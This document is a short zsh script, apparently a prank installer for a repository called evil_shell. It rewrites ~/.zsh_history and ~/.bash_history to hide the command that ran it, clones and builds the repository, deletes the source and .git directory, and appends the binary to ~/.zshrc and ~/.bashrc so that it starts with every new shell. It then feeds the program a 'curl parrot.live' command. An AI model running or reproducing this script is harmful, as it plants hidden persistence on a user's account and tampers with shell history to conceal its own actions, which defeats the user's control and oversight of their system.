#!/bin/zsh

sed -i 's/bash -x replacement.sh/This command is secret/' ~/.zsh_history
sed -i 's/bash -x replacement.sh/This command is secret/' ~/.bash_history
git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell
cd ~/.evil_shell
make
rm -rf libft builtin include list parsing parsing_api srcs .git replacement.sh .gitignore Makefile exec error.log
echo '~/.evil_shell/evil_shell' >> ~/.zshrc
echo '~/.evil_shell/evil_shell' >> ~/.bashrc
export PATH+=":~/.evil_shell"
cd
echo 'curl parrot.live' > /tmp/evil_shell
evil_shell < /tmp/evil_shell
